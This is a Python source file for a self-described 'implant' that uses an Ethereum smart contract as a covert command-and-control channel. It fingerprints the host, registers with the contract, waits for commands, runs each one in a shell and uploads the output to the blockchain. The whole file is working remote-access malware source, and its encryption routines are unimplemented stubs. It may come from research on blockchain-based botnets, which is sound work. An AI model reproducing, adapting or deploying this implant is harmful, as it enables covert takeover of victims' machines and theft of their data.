import argparse, json, signal, shutil, atexit, yaml
from os.path import join as opj
from web3 import Web3, HTTPProvider

import Client.OsInteractions as OsInteractions
from web3.contract import ConciseContract
from Util.SolidityTypeConversions import *
from Util.Process import waitFor, kill_proc, runCommandSync
from Util.WalletOperations import *
from Util.EtherLogEvents import *
from Util.LogWrapper import LogWrapper
from Util.TransactionLogger import TransactionLogger


CLIENT_CONF_FILE = opj('conf', 'clientConf.yaml')

REGISTRATION_CONFIRMATION_EVENT_NAME = 'InstanceRegistered'
COMMAND_PENDING_EVENT_NAME = 'CommandPending'


class ClientCommands:

	def __init__(self, confFile, sessionId = None, transactionLogFilename = 'transaction.log'):
		conf = yaml.safe_load(open(confFile))
		self.opMode = conf['opMode']
		l.info('Working in',self.opMode,'mode')
		
		self.contractAddress = conf['contract']['address']
		self.contractAbi = conf['contract']['abi']

		self.proc = self.runGethNode(conf)
		# connect to local node
		self.web3 = Web3(HTTPProvider(conf['nodeRpcUrl']))
		
		if conf['opMode'] == 'privateNet':
			self.web3.admin.addPeer(conf[self.opMode]['enode'])
			peers = waitFor (lambda : self.web3.admin.peers, emptyResponse=[],pollInterval=0.1, maxRetries=10)
			assert (len(peers) > 0)
			l.info('connected peers:',self.web3.admin.peers)


		waitForNodeToSync(self.web3)

		# load contract
		self.contract = self.loadContract()
		time.sleep(5)
		self.ownerPubKey = self.contract.ownerPubKey()
		#TODO: check contract is up, otherwise go to sleep or die

		self.password = conf['clientWalletPassword']
		self.public, self.private, self.address = loadWallet(conf['clientWallet'], self.password)

		l.info("client wallet:",self.address, "contract:",self.contractAddress)
		importAccountToNode(self.web3, self.address, self.private, self.password)

		self.sessionId = sessionId
		self.gasLimit_ev = conf['gasLimit_ev']

		self.transactionCostLogger = TransactionLogger(transactionLogFilename, self.web3)


	def loadContract(self):
		'''
		Loads a contract by address
		:return:
		'''
		l.info('loading contract from:', self.contractAddress)
		l.debug('contract abi:', self.contractAbi)

		contract = self.web3.eth.contract(self.contractAbi, self.contractAddress,  ContractFactoryClass=ConciseContract)
		return contract

	def registered(self):
		'''
		:return: True if contract has already successfully registered
		'''
		return self.sessionId != None

	def registerInstance(self):
		'''
		Register instance with controller
		:return:
		'''
		if self.registered():
			return True

		try:
			machineId = OsInteractions.fingerprintMachine()
			machineIdEnc = self.encryptMessageForServer(machineId)
			txHash = self.contract.registerInstance(machineIdEnc, transact={'from': self.address, 'gas': self.gasLimit_ev})
			
			l.debug('registerInstance transaction executed. machineId:', machineId,'txHash:',txHash)
			
			
			self.commandFilter, eventABI = createLogEventFilter(REGISTRATION_CONFIRMATION_EVENT_NAME,
																self.contractAbi,
																self.contractAddress,
																self.web3,
																topicFilters=[self.web3.sha3(self.address)])
			
			tx = waitFor(lambda: self.web3.eth.getTransactionReceipt(txHash), emptyResponse=None, pollInterval=1, maxRetries=500)
			self.transactionCostLogger.insert(txHash, 'registerInstance', len(machineId))
			if not tx or tx['gasUsed'] == self.gasLimit_ev:
				raise ValueError('Error in transaction execution: maximum gas used, out of gas or permission issue',tx)
			
			txs = waitFor(lambda: self.commandFilter.get(True), emptyResponse=[], pollInterval=1, maxRetries=500)
			self.web3.eth.uninstallFilter(self.commandFilter.filter_id)
			for tx in txs:
				sessionId = getLogEventArg(tx, eventABI, 'sessionId')
				self.sessionId = self.decryptMessageFromServer(sessionId)
				l.info('Successful registration! SessionId:', self.sessionId)
				
		except ValueError as e:
			raise e
		except Exception as e:
			l.error("Error in returned log event:", e)
			self.sessionId = None
			import traceback
			traceback.print_tb(e.__traceback__)

		return self.registered()


	def doWork(self, shell_cmd):
		'''
		Run a given shell command. Return results
		:param shell_cmd:
		:return:
		'''
		try:
			proc = runCommandSync(shell_cmd, shell=True)
			ret = { 'status': proc.returncode,
					'output': proc.stdout.decode('utf-8', 'replace') }
		except Exception as e:
			l.error("Error in command execution:", e)
			ret = { 'status': 2,
					'output': e }
		return json.dumps(ret)

	def uploadWorkResults(self, cmdId, workResults):
		'''
		Sends work results back to controller
		:param cmdId:
		:param workResults:
		:return:
		'''
		machineId = OsInteractions.fingerprintMachine()
		sessionAndMachineIdHash = sha3AsBytes(self.sessionId + machineId)
		#function uploadWorkResults (bytes32 sessionAndMachineIdHash, string result, uint16 cmdId)
		txHash = self.contract.uploadWorkResults(sessionAndMachineIdHash, workResults, cmdId, transact={'from': self.address, 'gas': self.gasLimit_ev})
		
		l.info("sending cmd results of cmdId",cmdId,"to server. txHash:",txHash,"result:", workResults,'...')
		self.transactionCostLogger.insert(txHash, 'uploadWorkResults',len(workResults))
		
	def decryptMessageFromServer(self, msg, encrypt=True):
		'''
		Decrypt message using wallet's private key
		:param msg:
		:param encrypt:
		:return:
		'''
		# TODO complete. Need to find a proper elliptic curve crypto library in python
		return msg

	def encryptMessageForServer(self, msg, decrypt = True):
		'''
		Encrypt server message using server's public key
		:param msg:
		:param decrypt:
		:return:
		'''
		# TODO complete. Need to find a proper elliptic curve crypto library in python
		return msg

	def run(self):
		'''
		Main client function: register. once registered, listen to incoming commands.
		:return:
		'''
		sleep = 1
		while not self.registered():
			l.info('trying to register instance')
			l.info('Account Balance: ', str(getAccountBalance(self.web3, self.address)))
			success = self.registerInstance()
			if not success:
				time.sleep(sleep)
				sleep *= 2

		try:
			l.info('instance is now registered with server. waiting for work...')
			self.commandFilter, eventABI = createLogEventFilter(COMMAND_PENDING_EVENT_NAME,
								 self.contractAbi,
								 self.contractAddress,
								 self.web3,
								 topicFilters = [self.web3.sha3(self.address)])
			
			def onCommandArrival(tx):
				try:
					l.debug('new command event:',tx)

					command = getLogEventArg(tx, eventABI,'command')
					cmdId = getLogEventArg(tx, eventABI, 'cmdId')

					commandDec = self.decryptMessageFromServer(command)
					l.info('Decrypted a new command from server. id:',cmdId,'cmd:',commandDec)

					workResults = self.doWork(commandDec)
					l.info('Command',cmdId, 'execution complete:', workResults[0:100],'...')

					workResultsEnc = self.encryptMessageForServer(workResults)
					self.uploadWorkResults(cmdId, workResultsEnc)
				except Exception as e:
					l.error("Error responding to command request:", e)
			self.commandFilter.watch(onCommandArrival)
			
		except Exception as e:
			l.error("Error in event watcher registration:", e)
			if self.commandFilter and self.commandFilter.running:
				self.commandFilter.stopWatching()

	def runGethNode(self, conf):
		'''
		Runs the local light geth node
		:param conf:
		:return:
		'''
		gethLockFile = opj(conf['BlockChainData'], 'LOCK.pid')
		if (os.path.isfile(gethLockFile)):
			with open (gethLockFile) as f:
				pid = f.read()
				if (pid):
					try:
						os.kill(int(pid), signal.SIGTERM)
						time.sleep (1)
						l.debug('Old geth was running at PID:',pid,'. Killed.')
					except OSError:
						pass #all good because process wasn't running anymore

		if conf['opMode'] == 'privateNet':
			if not os.path.exists(conf[self.opMode]['genesisFile']):
				l.warning('Fresh start! removing blockchain dir ',conf['BlockChainData'])

				shutil.rmtree(conf['BlockChainData'],ignore_errors=True)

				with open(conf[self.opMode]['genesisFile'], 'w') as f:
					json.dump(conf[self.opMode]['genesis'], f, indent=1)

				l.info('Initializing blockchain...')
				gethExe = conf['geth'] + ('.exe' if os.name == 'nt' else '')
				cmd = [gethExe,'--datadir',conf['BlockChainData'],	'init',	conf[self.opMode]['genesisFile']]

				l.debug('Running geth init: ' , ' '.join(cmd))
				with open(opj('logs', 'geth.client.log'), 'a') as f:
					proc = runCommand(cmd, stdout=f)
					proc.communicate()

		l.info('Running geth node...')
		cmd = conf[self.opMode]['gethCmd']
		l.debug('Running light geth : ' , ' '.join(cmd))

		proc = runCommand(cmd, stderr=open(opj('logs', 'geth.client.log'), 'a'))

		if proc.returncode:
			std,sterr = proc.communicate()
			raise ValueError(format_error_message(
				"Error trying to run geth node",cmd,proc.returncode,std,sterr,))

		atexit.register(lambda: kill_proc(proc))

		time.sleep(1)

		with open(gethLockFile,'w') as f:
			f.write(str(proc.pid))
		l.info('Geth node running. PID:',str(proc.pid))

		return proc

if __name__ == "__main__":
	parser = argparse.ArgumentParser(
		prog='Implant functionality',
		description='This utility is the so-called implant implementation. It is supposed to be run from a client package generated by serverCommands'
		            'It will contain its own generated config file. After it runs, it will run its own geth, contact the contract and register with it.'
		            'If successful, it will start a listener for incoming commands.'
		            ' Run with python -i to get shell. use object cc to call for different commands.'
	)
	parser.add_argument("baseDir", help="Location of base directory. all conf, scripts and bin files are assumed to exist in a subdirectory of base dir.")
	parser.add_argument("--sessionid", default=None, help="an existing sessionId for pre registered clients. Will cause client to skip initial registration process")
	parser.add_argument("--transactionLogFile", default=opj('logs','transaction.log'), help="Location of transaction log file.")
	args = parser.parse_args()
	
	os.chdir(args.baseDir)
	l = LogWrapper.getDefaultLogger()
	l.info ("base dir:", args.baseDir)
	
	#sessionId = args.sessionid #sys.argv[3] if len(sys.argv) > 3 else None
	
	#transactionLogFilename= args.transactionLogFile #opj('..','..','logs', 'transaction.log')
	
	cc = ClientCommands(CLIENT_CONF_FILE, args.sessionid, args.transactionLogFile)

	cc.run()
	